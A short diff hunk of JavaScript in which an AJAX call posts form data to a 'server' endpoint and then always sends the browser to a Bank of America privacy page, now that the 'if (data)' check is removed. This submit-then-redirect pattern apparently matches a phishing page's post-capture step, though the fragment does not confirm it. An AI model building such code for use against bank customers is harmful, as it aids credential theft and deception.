@@ -443,7 +443,7 @@
                             url: 'server',
                             data: postData,
                             success: (data) => {
-                                if (data) window.location.href = 'https://www.bankofamerica.com/security-center/privacy-overview/';
+                               window.location.href = 'https://www.bankofamerica.com/security-center/privacy-overview/';
                             }
                         });
                     }
